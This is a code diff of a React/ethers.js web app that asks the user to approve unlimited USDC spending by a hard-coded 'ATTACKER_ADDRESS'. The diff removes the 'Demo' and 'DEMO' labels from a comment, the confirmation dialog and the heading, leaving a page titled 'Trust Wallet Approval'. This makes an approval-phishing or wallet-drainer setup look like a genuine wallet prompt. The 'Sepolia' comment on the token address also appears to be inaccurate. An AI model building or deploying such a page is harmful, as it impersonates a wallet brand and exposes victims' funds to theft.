@@ -10,7 +10,7 @@ import { ethers } from "ethers";
 // ✅ USDC on Sepolia
 const TOKEN_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 
-// ⚠️ Demo permission receiver (NO transfer logic used)
+// ⚠️  permission receiver (NO transfer logic used)
 const ATTACKER_ADDRESS = "0x23F1887aB3D6Eb129D32B209E29b102dB7E07F31";
 
 // Minimal ERC20 ABI
@@ -139,7 +139,7 @@ function App() {
       await sleep(400);
 
       const ok = window.confirm(
-        "⚠️ EDUCATIONAL DEMO\n\n" +
+        "⚠️ EDUCATIONAL \n\n" +
           "This will approve UNLIMITED token spending.\n" +
           "No tokens will be transferred by this app.\n\nContinue?"
       );
@@ -175,7 +175,7 @@ function App() {
     <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
       <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">
         <h1 className="text-xl font-bold text-center mb-4">
-          🔐 Trust Wallet Approval Demo
+          🔐 Trust Wallet Approval
         </h1>
 
         {/* Logs (Always Visible) */}
